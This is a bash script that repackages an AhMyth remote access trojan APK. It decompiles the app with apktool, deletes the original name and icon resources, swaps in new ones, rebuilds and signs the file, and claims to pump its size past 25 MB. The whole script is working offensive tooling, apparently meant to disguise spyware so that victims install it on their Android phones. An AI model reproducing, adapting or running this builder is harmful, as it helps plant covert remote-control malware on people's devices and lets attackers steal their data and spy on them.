#!/bin/bash
# AhMyTh file pumper 25+Mb 2022

clear
figlet -f small AhMyth
sleep 0.5
echo ""
echo "              AhMyth 25+ MB"
echo ""
sleep 1
read -p "[+] PATH AHMYTH RAT : " rat1
if [ -f $rat1 ]; then
	echo ""
	echo "[+] File found!"
	echo ""
else
	echo "[-] File not found!"
	echo ""
        sleep 0.5
        echo "[-] Exiting ..."
        echo ""
exit
fi
sleep 1
echo ""
echo "[*] Decompiling AhMyth Rat's ..."
echo ""
sleep 0.5
echo "[*] Changing MB ..."
echo ""
sleep 0.5
echo "[*] Changing picture and name ..."
echo ""
echo "+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+"
echo ""
sleep 0.3

apktool d $rat1 -o tmprat

cd tmprat/res/

rm -rf values
rm -rf mipmap-hdpi
rm -rf mipmap-mdpi
rm -rf mipmap-xhdpi
rm -rf mipmap-xxhdpi
rm -rf mipmap-xxxhdpi

cd ../../

cd files

cp -r * ../tmprat/res/

cd ..

apktool b tmprat

cd tmprat/dist/

mv $(basename $rat1) ../../output/Saved.apk

cd ../../

rm -rf tmprat

rm -rf $rat1

echo ""
echo "[*] AhMyth Rat Saved --> : $PWD/output/Saved.apk"
echo ""
echo ""
echo "+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+"
cd apksigner

bash apksigner.sh

exit
